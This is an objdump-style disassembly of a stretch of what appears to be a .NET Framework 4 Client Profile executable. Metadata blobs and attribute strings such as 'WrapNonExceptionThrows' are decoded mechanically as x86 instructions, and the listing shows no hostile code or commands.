  40c99c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40c9a0:	01 08                	add    %ecx,(%eax)
  40c9a2:	0e                   	push   %cs
  40c9a3:	05 20 01 01 12       	add    $0x12010120,%eax
  40c9a8:	61                   	popa
  40c9a9:	04 20                	add    $0x20,%al
  40c9ab:	01 01                	add    %eax,(%ecx)
  40c9ad:	0a 04 20             	or     (%eax,%eiz,1),%al
  40c9b0:	01 01                	add    %eax,(%ecx)
  40c9b2:	0b 03                	or     (%ebx),%eax
  40c9b4:	20 00                	and    %al,(%eax)
  40c9b6:	0b 03                	or     (%ebx),%eax
  40c9b8:	20 00                	and    %al,(%eax)
  40c9ba:	0a 03                	or     (%ebx),%al
  40c9bc:	20 00                	and    %al,(%eax)
  40c9be:	0d 05 20 01 01       	or     $0x1012005,%eax
  40c9c3:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40c9c8:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40c9cd:	01 0e                	add    %ecx,(%esi)
  40c9cf:	0e                   	push   %cs
  40c9d0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c9d5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40c9d8:	01 02                	add    %eax,(%edx)
  40c9da:	0e                   	push   %cs
  40c9db:	03 20                	add    (%eax),%esp
  40c9dd:	00 0e                	add    %cl,(%esi)
  40c9df:	04 20                	add    $0x20,%al
  40c9e1:	01 01                	add    %eax,(%ecx)
  40c9e3:	02 04 20             	add    (%eax,%eiz,1),%al
  40c9e6:	01 01                	add    %eax,(%ecx)
  40c9e8:	0c 04                	or     $0x4,%al
  40c9ea:	20 01                	and    %al,(%ecx)
  40c9ec:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40c9f2:	5c                   	pop    %esp
  40c9f3:	04 20                	add    $0x20,%al
  40c9f5:	00 11                	add    %dl,(%ecx)
  40c9f7:	64 04 20             	fs add $0x20,%al
  40c9fa:	00 12                	add    %dl,(%edx)
  40c9fc:	59                   	pop    %ecx
  40c9fd:	03 28                	add    (%eax),%ebp
  40c9ff:	00 0e                	add    %cl,(%esi)
  40ca01:	03 28                	add    (%eax),%ebp
  40ca03:	00 0a                	add    %cl,(%edx)
  40ca05:	03 28                	add    (%eax),%ebp
  40ca07:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40ca0d:	5c                   	pop    %esp
  40ca0e:	04 28                	add    $0x28,%al
  40ca10:	00 11                	add    %dl,(%ecx)
  40ca12:	64 04 00             	fs add $0x0,%al
  40ca15:	00 00                	add    %al,(%eax)
  40ca17:	00 04 03             	add    %al,(%ebx,%eax,1)
  40ca1a:	00 00                	add    %al,(%eax)
  40ca1c:	00 04 04             	add    %al,(%esp,%eax,1)
  40ca1f:	00 00                	add    %al,(%eax)
  40ca21:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40ca28:	06                   	push   %es
  40ca29:	00 00                	add    %al,(%eax)
  40ca2b:	00 04 07             	add    %al,(%edi,%eax,1)
  40ca2e:	00 00                	add    %al,(%eax)
  40ca30:	00 04 08             	add    %al,(%eax,%ecx,1)
  40ca33:	00 00                	add    %al,(%eax)
  40ca35:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40ca38:	00 00                	add    %al,(%eax)
  40ca3a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ca3d:	00 00                	add    %al,(%eax)
  40ca3f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40ca42:	00 00                	add    %al,(%eax)
  40ca44:	00 06                	add    %al,(%esi)
  40ca46:	00 02                	add    %al,(%edx)
  40ca48:	0e                   	push   %cs
  40ca49:	12 61 08             	adc    0x8(%ecx),%ah
  40ca4c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40ca51:	61                   	popa
  40ca52:	06                   	push   %es
  40ca53:	00 02                	add    %al,(%edx)
  40ca55:	0e                   	push   %cs
  40ca56:	05 12 61 05 00       	add    $0x56112,%eax
  40ca5b:	01 01                	add    %eax,(%ecx)
  40ca5d:	12 61 06             	adc    0x6(%ecx),%ah
  40ca60:	00 02                	add    %al,(%edx)
  40ca62:	01 12                	add    %edx,(%edx)
  40ca64:	61                   	popa
  40ca65:	0e                   	push   %cs
  40ca66:	07                   	pop    %es
  40ca67:	00 02                	add    %al,(%edx)
  40ca69:	01 12                	add    %edx,(%edx)
  40ca6b:	61                   	popa
  40ca6c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40ca71:	01 12                	add    %edx,(%edx)
  40ca73:	61                   	popa
  40ca74:	0d 06 00 02 01       	or     $0x1020006,%eax
  40ca79:	12 61 0c             	adc    0xc(%ecx),%ah
  40ca7c:	06                   	push   %es
  40ca7d:	00 02                	add    %al,(%edx)
  40ca7f:	01 12                	add    %edx,(%edx)
  40ca81:	61                   	popa
  40ca82:	02 06                	add    (%esi),%al
  40ca84:	00 02                	add    %al,(%edx)
  40ca86:	01 12                	add    %edx,(%edx)
  40ca88:	61                   	popa
  40ca89:	0b 06                	or     (%esi),%eax
  40ca8b:	00 02                	add    %al,(%edx)
  40ca8d:	01 12                	add    %edx,(%edx)
  40ca8f:	61                   	popa
  40ca90:	0a 03                	or     (%ebx),%al
  40ca92:	06                   	push   %es
  40ca93:	11 78 04             	adc    %edi,0x4(%eax)
  40ca96:	20 01                	and    %al,(%ecx)
  40ca98:	01 08                	add    %ecx,(%eax)
  40ca9a:	08 01                	or     %al,(%ecx)
  40ca9c:	00 08                	add    %cl,(%eax)
  40ca9e:	00 00                	add    %al,(%eax)
  40caa0:	00 00                	add    %al,(%eax)
  40caa2:	00 1e                	add    %bl,(%esi)
  40caa4:	01 00                	add    %eax,(%eax)
  40caa6:	01 00                	add    %eax,(%eax)
  40caa8:	54                   	push   %esp
  40caa9:	02 16                	add    (%esi),%dl
  40caab:	57                   	push   %edi
  40caac:	72 61                	jb     0x40cb0f
  40caae:	70 4e                	jo     0x40cafe
  40cab0:	6f                   	outsl  %ds:(%esi),(%dx)
  40cab1:	6e                   	outsb  %ds:(%esi),(%dx)
  40cab2:	45                   	inc    %ebp
  40cab3:	78 63                	js     0x40cb18
  40cab5:	65 70 74             	gs jo  0x40cb2c
  40cab8:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40cabf:	77 73                	ja     0x40cb34
  40cac1:	01 05 20 01 01 11    	add    %eax,0x11010120
  40cac7:	71 08                	jno    0x40cad1
  40cac9:	01 00                	add    %eax,(%eax)
  40cacb:	02 00                	add    (%eax),%al
  40cacd:	00 00                	add    %al,(%eax)
  40cacf:	00 00                	add    %al,(%eax)
  40cad1:	05 01 00 00 00       	add    $0x1,%eax
  40cad6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40cad9:	00 07                	add    %al,(%edi)
  40cadb:	31 2e                	xor    %ebp,(%esi)
  40cadd:	30 2e                	xor    %ch,(%esi)
  40cadf:	30 2e                	xor    %ch,(%esi)
  40cae1:	30 00                	xor    %al,(%eax)
  40cae3:	00 65 01             	add    %ah,0x1(%ebp)
  40cae6:	00 29                	add    %ch,(%ecx)
  40cae8:	2e 4e                	cs dec %esi
  40caea:	45                   	inc    %ebp
  40caeb:	54                   	push   %esp
  40caec:	46                   	inc    %esi
  40caed:	72 61                	jb     0x40cb50
  40caef:	6d                   	insl   (%dx),%es:(%edi)
  40caf0:	65 77 6f             	gs ja  0x40cb62
  40caf3:	72 6b                	jb     0x40cb60
  40caf5:	2c 56                	sub    $0x56,%al
  40caf7:	65 72 73             	gs jb  0x40cb6d
  40cafa:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40cb01:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40cb04:	72 6f                	jb     0x40cb75
  40cb06:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40cb0d:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40cb14:	0e                   	push   %cs
  40cb15:	14 46                	adc    $0x46,%al
  40cb17:	72 61                	jb     0x40cb7a
  40cb19:	6d                   	insl   (%dx),%es:(%edi)
  40cb1a:	65 77 6f             	gs ja  0x40cb8c
  40cb1d:	72 6b                	jb     0x40cb8a
  40cb1f:	44                   	inc    %esp
  40cb20:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40cb27:	61                   	popa
  40cb28:	6d                   	insl   (%dx),%es:(%edi)
  40cb29:	65 1f                	gs pop %ds
  40cb2b:	2e 4e                	cs dec %esi
  40cb2d:	45                   	inc    %ebp
  40cb2e:	54                   	push   %esp
  40cb2f:	20 46 72             	and    %al,0x72(%esi)
  40cb32:	61                   	popa
  40cb33:	6d                   	insl   (%dx),%es:(%edi)
  40cb34:	65 77 6f             	gs ja  0x40cba6
  40cb37:	72 6b                	jb     0x40cba4
  40cb39:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40cb3c:	43                   	inc    %ebx
  40cb3d:	6c                   	insb   (%dx),%es:(%edi)
  40cb3e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40cb45:	6f                   	outsl  %ds:(%esi),(%dx)
  40cb46:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40cb4d:	04 49                	add    $0x49,%al
  40cb4f:	74 65                	je     0x40cbb6
  40cb51:	6d                   	insl   (%dx),%es:(%edi)
  40cb52:	00 00                	add    %al,(%eax)
  40cb54:	03 07                	add    (%edi),%eax
  40cb56:	01 08                	add    %ecx,(%eax)
  40cb58:	04 00                	add    $0x0,%al
  40cb5a:	01 08                	add    %ecx,(%eax)
  40cb5c:	0e                   	push   %cs
  40cb5d:	03 07                	add    (%edi),%eax
  40cb5f:	01 02                	add    %eax,(%edx)
  40cb61:	05 00 00 12 80       	add    $0x80120000,%eax
  40cb66:	b1 05                	mov    $0x5,%cl
  40cb68:	20 01                	and    %al,(%ecx)
  40cb6a:	0e                   	push   %cs
  40cb6b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40cb70:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40cb76:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40cb7c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40cb81:	03 02                	add    (%edx),%eax
  40cb83:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40cb88:	14 07                	adc    $0x7,%al
  40cb8a:	08 0e                	or     %cl,(%esi)
  40cb8c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40cb92:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40cb98:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40cb9e:	20 03                	and    %al,(%ebx)
  40cba0:	01 11                	add    %edx,(%ecx)
  40cba2:	80 d5 11             	adc    $0x11,%ch
  40cba5:	80 d9 11             	sbb    $0x11,%cl
  40cba8:	80 dd 05             	sbb    $0x5,%ch
  40cbab:	00 02                	add    %al,(%edx)
  40cbad:	02 0e                	add    (%esi),%cl
  40cbaf:	0e                   	push   %cs
  40cbb0:	06                   	push   %es
  40cbb1:	20 01                	and    %al,(%ecx)
  40cbb3:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40cbb8:	20 01                	and    %al,(%ecx)
  40cbba:	08 08                	or     %cl,(%eax)
  40cbbc:	07                   	pop    %es
  40cbbd:	00 01                	add    %al,(%ecx)
  40cbbf:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40cbc4:	07                   	pop    %es
  40cbc5:	20 02                	and    %al,(%edx)
  40cbc7:	01 12                	add    %edx,(%edx)
  40cbc9:	80 c9 08             	or     $0x8,%cl
  40cbcc:	06                   	push   %es
  40cbcd:	20 01                	and    %al,(%ecx)
  40cbcf:	01 12                	add    %edx,(%edx)
  40cbd1:	80 f1 09             	xor    $0x9,%cl
  40cbd4:	20 02                	and    %al,(%edx)
  40cbd6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40cbdb:	80 f5 05             	xor    $0x5,%ch
  40cbde:	20 02                	and    %al,(%edx)
  40cbe0:	08 08                	or     %cl,(%eax)
  40cbe2:	08 06                	or     %al,(%esi)
  40cbe4:	20 02                	and    %al,(%edx)
  40cbe6:	01 12                	add    %edx,(%edx)
  40cbe8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40cbed:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40cbf0:	09 20                	or     %esp,(%eax)
  40cbf2:	03 01                	add    (%ecx),%eax
  40cbf4:	12 61 02             	adc    0x2(%ecx),%ah
  40cbf7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40cbfd:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40cc03:	01 0e                	add    %ecx,(%esi)
  40cc05:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40cc0b:	02 09                	add    (%ecx),%cl
  40cc0d:	20 04 01             	and    %al,(%ecx,%eax,1)
  40cc10:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40cc16:	0c 20                	or     $0x20,%al
  40cc18:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40cc1d:	08 08                	or     %cl,(%eax)
  40cc1f:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40cc25:	01 11                	add    %edx,(%ecx)
  40cc27:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40cc2d:	02 12                	add    (%edx),%dl
  40cc2f:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40cc32:	02 08                	add    (%eax),%cl
  40cc34:	08 05 20 01 08 12    	or     %al,0x12080120
  40cc3a:	25 06 00 02 08       	and    $0x8020006,%eax
  40cc3f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40cc44:	03 08                	add    (%eax),%ecx
  40cc46:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40cc4b:	20 01                	and    %al,(%ecx)
  40cc4d:	01 12                	add    %edx,(%edx)
  40cc4f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40cc55:	1c 0c                	sbb    $0xc,%al
  40cc57:	07                   	pop    %es
  40cc58:	06                   	push   %es
  40cc59:	1c 02                	sbb    $0x2,%al
  40cc5b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40cc60:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40cc66:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40cc69:	02 07                	add    (%edi),%al
  40cc6b:	20 02                	and    %al,(%edx)
  40cc6d:	02 08                	add    (%eax),%cl
  40cc6f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40cc75:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40cc7b:	07                   	pop    %es
  40cc7c:	0a 12                	or     (%edx),%dl
  40cc7e:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40cc85:	08 12 81 
  40cc88:	41                   	inc    %ecx
  40cc89:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40cc8f:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40cc94:	4d                   	dec    %ebp
  40cc95:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cc9a:	0e                   	push   %cs
  40cc9b:	05 00 00 12 81       	add    $0x81120000,%eax
  40cca0:	41                   	inc    %ecx
  40cca1:	05 20 00 12 81       	add    $0x81120020,%eax
  40cca6:	55                   	push   %ebp
  40cca7:	06                   	push   %es
  40cca8:	00 00                	add    %al,(%eax)
  40ccaa:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40ccaf:	00 01                	add    %al,(%ecx)
  40ccb1:	0e                   	push   %cs
  40ccb2:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40ccb7:	01 11                	add    %edx,(%ecx)
  40ccb9:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40ccc0:	41                   	inc    %ecx
  40ccc1:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40ccc7:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40ccce:	49                   	dec    %ecx
  40cccf:	0e                   	push   %cs
  40ccd0:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40ccd6:	0e                   	push   %cs
  40ccd7:	0e                   	push   %cs
  40ccd8:	0e                   	push   %cs
  40ccd9:	0e                   	push   %cs
  40ccda:	05 20 02 01 0e       	add    $0xe010220,%eax
  40ccdf:	1c 07                	sbb    $0x7,%al
  40cce1:	20 02                	and    %al,(%edx)
  40cce3:	01 0e                	add    %ecx,(%esi)
  40cce5:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40cceb:	0a 02                	or     (%edx),%al
  40cced:	10 07                	adc    %al,(%edi)
  40ccef:	06                   	push   %es
  40ccf0:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40ccf6:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40ccfc:	0e                   	push   %cs
  40ccfd:	02 05 20 00 12 81    	add    0x81120020,%al
  40cd03:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40cd09:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40cd0f:	91                   	xchg   %eax,%ecx
  40cd10:	04 20                	add    $0x20,%al
  40cd12:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40cd15:	04 07                	add    $0x7,%al
  40cd17:	02 02                	add    (%edx),%al
  40cd19:	02 03                	add    (%ebx),%al
  40cd1b:	20 00                	and    %al,(%eax)
  40cd1d:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40cd20:	02 18                	add    (%eax),%bl
  40cd22:	02 03                	add    (%ebx),%al
  40cd24:	07                   	pop    %es
  40cd25:	01 0e                	add    %ecx,(%esi)
  40cd27:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd2c:	9d                   	popf
  40cd2d:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40cd32:	1c 0a                	sbb    $0xa,%al
  40cd34:	07                   	pop    %es
  40cd35:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40cd3a:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40cd3f:	20 01                	and    %al,(%ecx)
  40cd41:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40cd47:	0e                   	push   %cs
  40cd48:	08 08                	or     %cl,(%eax)
  40cd4a:	06                   	push   %es
  40cd4b:	07                   	pop    %es
  40cd4c:	02 02                	add    (%edx),%al
  40cd4e:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40cd54:	0e                   	push   %cs
  40cd55:	0e                   	push   %cs
  40cd56:	0e                   	push   %cs
  40cd57:	05 20 00 11 81       	add    $0x81110020,%eax
  40cd5c:	ad                   	lods   %ds:(%esi),%eax
  40cd5d:	05 00 00 12 81       	add    $0x81120000,%eax
  40cd62:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40cd67:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40cd6d:	02 11                	add    (%ecx),%dl
  40cd6f:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40cd75:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40cd7c:	12 81 8d 
  40cd7f:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40cd85:	12 41 01             	adc    0x1(%ecx),%al
  40cd88:	0e                   	push   %cs
  40cd89:	05 20 01 01 13       	add    $0x13010120,%eax
  40cd8e:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40cd94:	00 06                	add    %al,(%esi)
  40cd96:	00 02                	add    %al,(%edx)
  40cd98:	0e                   	push   %cs
  40cd99:	0e                   	push   %cs
  40cd9a:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40cd9f:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40cda4:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40cdaa:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40cdb0:	c5 09                	lds    (%ecx),%ecx
  40cdb2:	00 02                	add    %al,(%edx)
  40cdb4:	02 11                	add    (%ecx),%dl
  40cdb6:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40cdbc:	07                   	pop    %es
  40cdbd:	02 12                	add    (%edx),%dl
  40cdbf:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40cdc4:	01 02                	add    %eax,(%edx)
  40cdc6:	0e                   	push   %cs
  40cdc7:	10 02                	adc    %al,(%edx)
  40cdc9:	06                   	push   %es
  40cdca:	00 01                	add    %al,(%ecx)
  40cdcc:	01 12                	add    %edx,(%edx)
  40cdce:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40cdd4:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40cddb:	0e                   	push   %cs
  40cddc:	1c 11                	sbb    $0x11,%al
  40cdde:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40cde4:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40cdeb:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40cdf1:	05 07 20 02 12       	add    $0x12022007,%eax
  40cdf6:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40cdfd:	12 60 0e             	adc    0xe(%eax),%ah
  40ce00:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce05:	12 60 12             	adc    0x12(%eax),%ah
  40ce08:	60                   	pusha
  40ce09:	06                   	push   %es
  40ce0a:	15 12 41 01 12       	adc    $0x12014112,%eax
  40ce0f:	60                   	pusha
  40ce10:	10 10                	adc    %dl,(%eax)
  40ce12:	01 01                	add    %eax,(%ecx)
  40ce14:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40ce19:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40ce1f:	1e                   	push   %ds
  40ce20:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40ce23:	01 12                	add    %edx,(%edx)
  40ce25:	60                   	pusha
  40ce26:	09 20                	or     %esp,(%eax)
  40ce28:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40ce2e:	13 00                	adc    (%eax),%eax
  40ce30:	07                   	pop    %es
  40ce31:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40ce36:	12 60 04             	adc    0x4(%eax),%ah
  40ce39:	20 00                	and    %al,(%eax)
  40ce3b:	13 00                	adc    (%eax),%eax
  40ce3d:	05 20 01 02 13       	add    $0x13020120,%eax
  40ce42:	00 03                	add    %al,(%ebx)
  40ce44:	07                   	pop    %es
  40ce45:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40ce4c:	e5 07                	in     $0x7,%eax
  40ce4e:	20 01                	and    %al,(%ecx)
  40ce50:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40ce56:	20 01                	and    %al,(%ecx)
  40ce58:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40ce5e:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40ce61:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40ce67:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40ce6d:	00 02                	add    %al,(%edx)
  40ce6f:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40ce75:	0e                   	push   %cs
  40ce76:	1c 00                	sbb    $0x0,%al
  40ce78:	05 12 82 05 11       	add    $0x11058212,%eax
  40ce7d:	82 09 0e             	orb    $0xe,(%ecx)
  40ce80:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce85:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40ce8b:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40ce90:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40ce96:	45                   	inc    %ebp
  40ce97:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40ce9d:	4d                   	dec    %ebp
  40ce9e:	1c 12                	sbb    $0x12,%al
  40cea0:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cea5:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40ceaa:	0e                   	push   %cs
  40ceab:	0b 00                	or     (%eax),%eax
  40cead:	01 15 12 45 01 13    	add    %edx,0x13014512
  40ceb3:	00 12                	add    %dl,(%edx)
  40ceb5:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40cebc:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40cec1:	4d                   	dec    %ebp
  40cec2:	1c 12                	sbb    $0x12,%al
  40cec4:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40cec9:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40cece:	0e                   	push   %cs
  40cecf:	17                   	pop    %ss
  40ced0:	20 0a                	and    %cl,(%edx)
  40ced2:	01 13                	add    %edx,(%ebx)
  40ced4:	00 13                	add    %dl,(%ebx)
  40ced6:	01 13                	add    %edx,(%ebx)
  40ced8:	02 13                	add    (%ebx),%dl
  40ceda:	03 13                	add    (%ebx),%edx
  40cedc:	04 13                	add    $0x13,%al
  40cede:	05 13 06 13 07       	add    $0x7130613,%eax
  40cee3:	13 08                	adc    (%eax),%ecx
  40cee5:	13 09                	adc    (%ecx),%ecx
  40cee7:	05 07 01 12 82       	add    $0x82120107,%eax
  40ceec:	0d 07 20 03 01       	or     $0x1032007,%eax
  40cef1:	0e                   	push   %cs
  40cef2:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40cef7:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40cefd:	06                   	push   %es
  40cefe:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40cf04:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40cf0a:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40cf0f:	20 01                	and    %al,(%ecx)
  40cf11:	01 11                	add    %edx,(%ecx)
  40cf13:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40cf1a:	82 31 05             	xorb   $0x5,(%ecx)
  40cf1d:	20 00                	and    %al,(%eax)
  40cf1f:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40cf25:	01 12                	add    %edx,(%edx)
  40cf27:	61                   	popa
  40cf28:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40cf2e:	08 20                	or     %ah,(%eax)
  40cf30:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40cf36:	08 1a                	or     %bl,(%edx)
  40cf38:	07                   	pop    %es
  40cf39:	0a 12                	or     (%edx),%dl
  40cf3b:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40cf42:	21 1d 05 
  40cf45:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40cf4a:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40cf51:	05 0c 00 05 01       	add    $0x105000c,%eax
  40cf56:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40cf5c:	45                   	inc    %ebp
  40cf5d:	08 08                	or     %cl,(%eax)
  40cf5f:	04 07                	add    $0x7,%al
  40cf61:	02 02                	add    (%edx),%al
  40cf63:	08 09                	or     %cl,(%ecx)
  40cf65:	00 02                	add    %al,(%edx)
  40cf67:	01 12                	add    %edx,(%edx)
  40cf69:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40cf6d:	4d                   	dec    %ebp
  40cf6e:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40cf73:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40cf79:	05 08 05 07 07       	add    $0x7070508,%eax
  40cf7e:	02 12                	add    (%edx),%dl
  40cf80:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40cf84:	08 07                	or     %al,(%edi)
  40cf86:	04 12                	add    $0x12,%al
  40cf88:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40cf8d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40cf92:	1c 06                	sbb    $0x6,%al
  40cf94:	07                   	pop    %es
  40cf95:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40cf9b:	20 01                	and    %al,(%ecx)
  40cf9d:	13 00                	adc    (%eax),%eax
  40cf9f:	08 04 07             	or     %al,(%edi,%eax,1)
  40cfa2:	01 12                	add    %edx,(%edx)
  40cfa4:	60                   	pusha
  40cfa5:	0e                   	push   %cs
  40cfa6:	07                   	pop    %es
  40cfa7:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40cfac:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40cfb2:	12 60 07             	adc    0x7(%eax),%ah
  40cfb5:	07                   	pop    %es
  40cfb6:	04 08                	add    $0x8,%al
  40cfb8:	05 1d 05 08 04       	add    $0x408051d,%eax
  40cfbd:	20 01                	and    %al,(%ecx)
  40cfbf:	01 05 04 07 01 11    	add    %eax,0x11010704
  40cfc5:	64 04 00             	fs add $0x0,%al
  40cfc8:	01 0b                	add    %ecx,(%ebx)
  40cfca:	0a 04 00             	or     (%eax,%eax,1),%al
  40cfcd:	01 0b                	add    %ecx,(%ebx)
  40cfcf:	0e                   	push   %cs
  40cfd0:	04 00                	add    $0x0,%al
  40cfd2:	01 0b                	add    %ecx,(%ebx)
  40cfd4:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40cfd9:	0c 06                	or     $0x6,%al
  40cfdb:	00 01                	add    %al,(%ecx)
  40cfdd:	0b 11                	or     (%ecx),%edx
